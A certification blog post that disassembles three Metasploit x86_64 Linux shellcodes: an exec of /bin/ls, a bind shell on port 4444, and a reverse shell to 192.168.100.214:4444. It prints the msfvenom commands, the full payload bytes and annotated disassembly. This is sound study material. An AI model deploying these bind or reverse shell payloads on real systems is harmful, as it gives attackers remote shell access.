---
layout: post
title: Analyzing Metasploit's x86_64 Shellcode
date: 2021-01-17 20:30:00
categories: posts
comments: false
en: true
---

These series of posts starting with the prefix "SLAE64 - Assignment" will be created in order to fulfill the requirements of the SLAE64 certification. 

The fifth assignment from the seven requires analyzing three [shellcodes](https://es.wikipedia.org/wiki/Shellcode) generated by Metasploit in the x86_64 format. 
Furthermore, it is required to report the findings during the analysis.

#### linux/x64/exec (Shellcode #1)

The first shellcode to be analyzed will execute the operation ```/bin/ls```

Generating the shellcode with msfvenom:

```term
root@whitecr0wz:~# msfvenom -p linux/x64/exec CMD=/bin/ls -i 0 -f c 
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 47 bytes
Final size of c file: 224 bytes
unsigned char buf[] = 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53"
"\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8\x08\x00"
"\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89\xe6"
"\x0f\x05";
root@whitecr0wz:~#
```

##### Ndisasm

```term
root@whitecr0wz:~# echo -ne 
"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48
\x89\xe6\x52\xe8\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x6c\x73\x00\x56\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
00000000  6A3B              push byte +0x3b                         ; Pushes 59 (execve syscall value) into the stack.
00000002  58                pop rax                                 ; Pops this value into RAX.
00000003  99                cdq                                     ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
00000004  48BB2F62696E2F73  mov rbx,0x68732f6e69622f                ; Moves '/bin/sh' into RBX.
         -6800
0000000E  53                push rbx                                ; The value in RBX is pushed into the stack.
0000000F  4889E7            mov rdi,rsp                             ; The value of RSP is copied into RDI.
00000012  682D630000        push qword 0x632d                       ; The value '-c' is pushed into the stack.
00000017  4889E6            mov rsi,rsp                             ; The value of RSP is copied into RSI.
0000001A  52                push rdx                                ; Pushes the NULL DWORD found in RDX.
0000001B  E808000000        call 0x28                               ; Calls the function that pushes '/bin/ls' into RSI, then pushes RSI into the stack.
00000020  2F                db 0x2f
00000021  62                db 0x62
00000022  696E2F6C730056    imul ebp,[rsi+0x2f],dword 0x5600736c
00000029  57                push rdi                                ; Pushes the value of RDI (/bin/sh) into the stack.
0000002A  4889E6            mov rsi,rsp                             ; The value of RSP is copied into RSI,
0000002D  0F05              syscall                                 ; The syscall is executed.
root@whitecr0wz:~#
```

##### GDB

Generating the shellcode with msfvenom:

```term
root@whitecr0wz:~# msfvenom -p linux/x64/exec CMD=/bin/ls -i 0 -f dw
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 48 bytes
Final size of dw file: 146 bytes
0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x00000008,
0x6e69622f, 0x00736c2f, 0x89485756, 0x00050fe6
root@whitecr0wz:~#
```

###### Contents of dissect_1

```term
global _start

_start:

       jmp short master

main:

       pop rbp
       jmp rbp


master:

       call main
       shellcode: dd 0x99583b6a, 0x622fbb48, 0x732f6e69, 0x48530068, 0x2d68e789, 0x48000063, 0xe852e689, 0x00000008, 0x6e69622f, 0x00736c2f, 0x89485756, 0x00050fe6
```

Let's analyze the value of RBP when the instruction ```pop rbp``` is executed.

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect1$ gdb -q ./dissect_1 
Reading symbols from ./dissect_1...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x401002
(gdb) run
Starting program: /home/whitecr0wz/assembly/assignments/Assignment_5/dissect1/dissect_1 

Breakpoint 1, 0x0000000000401002 in main ()
(gdb) disassemble
Dump of assembler code for function main:
=> 0x0000000000401002 <+0>:     pop    %rbp
   0x0000000000401003 <+1>:     jmpq   *%rbp
End of assembler dump.
(gdb) nexti
0x0000000000401003 in main ()
(gdb) x/7s $rbp 
0x40100a <shellcode>:   "j;X\231H\273/bin/sh"
0x401018 <shellcode+14>:        "SH\211\347h-c"
0x401020 <shellcode+22>:        ""
0x401021 <shellcode+23>:        "H\211\346R\350\b"
0x401028 <shellcode+30>:        ""
0x401029 <shellcode+31>:        ""
0x40102a <shellcode+32>:        "/bin/ls"
(gdb)
```

#### Conclusion (#1 Shellcode)

Indeed, it seems as if ```/bin/ls``` is the last thing to be pushed into the stack. Furthermore, there is a great quantity of space between ```-c``` and ```/bin/ls``` itself.

#### linux/x64/shell_bind_tcp (#2 Shellcode)

###### Generating shellcode

```term
root@whitecr0wz:~# msfvenom -p linux/x64/shell_bind_tcp -i 0 -f c[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 86 bytes
Final size of c file: 386 bytes
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x52"
"\xc7\x04\x24\x02\x00\x11\x5c\x48\x89\xe6\x6a\x10\x5a\x6a\x31"
"\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48\x31\xf6\x6a\x2b\x58\x0f"
"\x05\x48\x97\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"
"\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
root@whitecr0wz:~#
```

##### Ndisasm

```term
whitecr0wz@SLAE64:~/assembly/assignments/Assignment_5/dissect2$ echo -ne 
"\x6A\x29\x58\x99\x6A\x02\x5F\x6A\x01\x5E\x0F\x05\x48\x97\x52\xC7\x04\x24\x02\x00\x11\x5C\x48\x89\xE6\x6A\x10\x5A\x6A\x31\x58\x0F\x05\x6A\x32\x58\x0F\x05
\x48\x31\xF6\x6A\x2B\x58\x0F\x05\x48\x97\x6A\x03\x5E\x48\xFF\xCE\x6A\x21\x58\x0F\x05\x75\xF6\x6A\x3B\x58\x99\x48
\xBB\x2F\x62\x69\x6E\x2F\x73\x68\x00\x53\x48\x89\xE7\x52\x57\x48\x89\xE6\x0F\x05" | ndisasm -u - -b 64 
00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.        
00000002  58                pop rax                           ; Pops this value into RAX.
00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
00000004  6A02              push byte +0x2                    ; Pushes value 2 into the stack.
00000006  5F                pop rdi                           ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.
00000007  6A01              push byte +0x1                    ; Pushes value 1 into the stack.
00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
0000000A  0F05              syscall                           ; Executes the syscall.
0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This saves the value in RDI for sockfd operations.
0000000E  52                push rdx                          ; Pushes the value of RDX. As it is a NULL, the NULL-DWORD is pushed as a 0, which is an argument of the const 
                                                              ; struct addr.
0000000F  C704240200115C    mov dword [rsp],0x5c110002        ; Pushes 4444 in hex into the stack. However, as 4444 is not big enough for RSP, a few NULLs are parsed.
00000016  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
00000019  6A10              push byte +0x10                   ; The value "16" is pushed into the stack.
0000001B  5A                pop rdx                           ; Pops this value into RDX. This satisfies the length argument.
0000001C  6A31              push byte +0x31                   ; Pushes syscall value 49 (value of the bind syscall) into the stack.  
0000001E  58                pop rax                           ; Pops this value into RAX.
0000001F  0F05              syscall                           ; Executes the syscall.
00000021  6A32              push byte +0x32                   ; Pushes syscall value 50 (value of the listen syscall) into the stack.  
00000023  58                pop rax                           ; Pops this value into RAX.
00000024  0F05              syscall                           ; Executes the syscall.
00000026  4831F6            xor rsi,rsi                       ; Zeroes out RSI.
00000029  6A2B              push byte +0x2b                   ; Pushes syscall value 43 (value of the accept syscall) into the stack.  
0000002B  58                pop rax                           ; Pops this value into RAX.
0000002C  0F05              syscall                           ; Executes the syscall.
0000002E  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
00000030  6A03              push byte +0x3                    ; Pushes value 3 into the stack.
00000032  5E                pop rsi                           ; Pops this value into RSI.
00000033  48FFCE            dec rsi                           ; Decrements RSI.
00000036  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the dup2 syscall) into the stack.  
00000038  58                pop rax                           ; Pops this value into RAX.
00000039  0F05              syscall                           ; Executes the syscall.
0000003B  75F6              jnz 0x33                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi 
                                                              ; instruction), the loop will not stop.
0000003D  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.  
0000003F  58                pop rax                           ; Pops this value into RAX.
00000040  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
00000041  48BB2F62696E2F73  mov rbx,0x68732f6e69622f          ; Moves value "/bin/sh" into RBX.
         -6800
0000004B  53                push rbx                          ; Pushes the RBX into the stack.
0000004C  4889E7            mov rdi,rsp                       ; The value of RSP is copied into RDI.
0000004F  52                push rdx                          ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.
00000050  57                push rdi                          ; RDI (/bin/sh) is pushed into the stack.
00000051  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
00000054  0F05              syscall                           ; Executes the syscall.
```

#### Conclusion (#2 Shellcode)

Sadly enough, there isn't much to comment, as most of the important explanation has been done through the comments. It simply is a shell that binds to port 4444.

#### linux/x64/shell_reverse_tcp (#3 Shellcode)

###### Generating shellcode

```term
root@whitecr0wz:~# msfvenom -p linux/x64/shell_reverse_tcp -i 0 -f c
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of c file: 335 bytes
unsigned char buf[] =
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48"
"\xb9\x02\x00\x11\x5c\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10"
"\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58"
"\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
root@whitecr0wz:~#
```

##### Ndisasm

```term
root@whitecr0wz:~# echo -ne 
"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48\x97\x48\xb9\x02\x00\x11\x5c
\xc0\xa8\x64\xd6\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\x48\xff\xce\x6a\x21
\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05" | ndisasm -u - -b 64 
00000000  6A29              push byte +0x29                   ; Pushes syscall value 41 (value of the socket syscall) into the stack.   
00000002  58                pop rax                           ; Pops this value into RAX.
00000003  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
00000004  6A02              push byte +0x2                    ; Pushes the value 2 into the stack.
00000006  5F                pop rdi                           ; Pops this value into RDI. This will grant RDI with AF_INET, satisfying the *domain* argument.
00000007  6A01              push byte +0x1                    ; Pushes the value 1 into the stack.
00000009  5E                pop rsi                           ; Pops this value into RSI. This will grant RSI with SOCK_STREAM, satisfying the *type* argument.
0000000A  0F05              syscall                           ; Executes the syscall.
0000000C  4897              xchg rax,rdi                      ; Exchanges the value between RAX and RDI. This is done in order to satisfy further sockfd arguments.
0000000E  48B90200115CC0A8  mov rcx,0xd664a8c05c110002        ; Pushes "192.168.100.214:4444" within the hex format in reverse. Furthermore, as this string is not long enough to 
                                                              ; fulfill RCX, additional nulls are parsed.
         -64D6
00000018  51                push rcx                          ; RCX is pushed into the stack.
00000019  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
0000001C  6A10              push byte +0x10                   ; Pushes the value 16 into the stack.
0000001E  5A                pop rdx                           ; Pops this value into RDX. This satisfies the length argument.
0000001F  6A2A              push byte +0x2a                   ; Pushes syscall value 42 (value of the socket connect) into the stack.
00000021  58                pop rax                           ; Pops this value into RAX.
00000022  0F05              syscall                           ; Executes the syscall.
00000024  6A03              push byte +0x3                    ; The value 3 is pushed into the stack.
00000026  5E                pop rsi                           ; Pops this value into RSI.
00000027  48FFCE            dec rsi                           ; Decrements RSI.
0000002A  6A21              push byte +0x21                   ; Pushes syscall value 33 (value of the socket dup2) into the stack.
0000002C  58                pop rax                           ; Pops this value into RAX.
0000002D  0F05              syscall                           ; Executes the syscall.
0000002F  75F6              jnz 0x27                          ; Jump if the Zero flag (ZF) hasn't been set. This means that until RSI doesn't hit zero (through the dec rsi 
                                                              ; instruction), the loop will not stop.
00000031  6A3B              push byte +0x3b                   ; Pushes syscall value 59 (value of the execve syscall) into the stack.
00000033  58                pop rax                           ; Pops this value into RAX.
00000034  99                cdq                               ; EDX:EAX ← sign-extend of EAX. Commonly used to clean RDX.
00000035  48BB2F62696E2F73  mov rbx,0x68732f6e69622f          ; Moves value "/bin/sh" into RBX.
         -6800
0000003F  53                push rbx                          ; Pushes the RBX into the stack.
00000040  4889E7            mov rdi,rsp                       ; The value of RSP is copied into RDI.
00000043  52                push rdx                          ; RDX is pushed. It is most likely that this is simply a NULL-DWORD.
00000044  57                push rdi                          ; RDI (/bin/sh) is pushed into the stack.
00000045  4889E6            mov rsi,rsp                       ; The value of RSP is copied into RSI.
00000048  0F05              syscall                           ; Executes the syscall.
```

Once again, there isn't much to comment, as most of the important explanation has been done through the comments. It simply is a reverse-shell that arranges a connection towards 
the local address in port 4444.

### Code

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)

Student ID: SLAE64-27812/PA-27812

You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/SLAE64).
